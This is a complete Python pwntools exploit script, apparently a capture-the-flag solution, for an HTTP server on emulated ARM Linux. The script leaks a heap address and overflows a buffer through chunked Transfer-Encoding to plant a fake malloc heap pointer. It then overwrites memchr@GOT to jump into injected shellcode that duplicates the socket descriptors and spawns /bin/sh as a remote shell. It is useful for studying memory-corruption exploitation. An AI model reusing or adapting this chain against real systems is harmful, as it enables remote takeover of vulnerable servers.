from pwn import *
from time import sleep

context.arch = "arm"
context.os = "linux"

# Connect to the server that runs qemu, get the port to the actual ARM system
r1 = remote("localhost", 1337)
r1.sendlineafter(">> ", "\n") # should be PoW, but patched it for convenience
r1.recvuntil("Your port: ")
port = int(r1.recv(5))
r1.recvuntil("8888...")
# Connect to the ARM system
r2 = remote("localhost", port)
# Send a normal valid request, get the initial heap address
r2.send("G / H\n\n\n")
sleep(1)
r1.recvuntil("00004 (")
initial_heap = int(r1.recv(10), 16)
log.info("initial_heap: " + hex(initial_heap))
# Send the header that enables chunked encoding and have enough padding to setup the overflow
r2.send("P /echo H\nTransfer-Encoding:chunked\nA:AAAAAAAA\n\n")
sleep(1)
# Construct and send the first chunk, which will overwrite *__malloc_heap to point to a fake one that we crafted inside the chunk
# > initial_heap + 0x100 is where the fake *__malloc_heap will be
# > initial_heap - 0xxxxxx is the fake size, which will make malloc return a pointer in the GOT
payload = "\0"*5 + p32(initial_heap + 0x100) + p32(initial_heap - 0x11C00) + "\0"*35
r2.send(hex(len(payload))[2:] + "\n" + payload + "\n")
sleep(1)
# Construct and send the second chunk, this will inject shellcode and overwrite memchr@GOT to shellcode address
shellcode = asm(
    shellcraft.nop()*0x10 + 
    shellcraft.arm.linux.dup2(4, 0) +
    shellcraft.arm.linux.dup2(4, 1) +
    shellcraft.arm.linux.dup2(4, 2)
    )
shellcode += "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x03\xa0\x52\x40\xc2\x71\x05\xb4\x69\x46\x0b\x27\x01\xdf\x7f\x40\x2f\x62\x69\x6e\x2f\x73\x68\x41"
payload2 = "A"*136 + p32(0x11e04) + shellcode
r2.send(payload2)

r2.interactive()
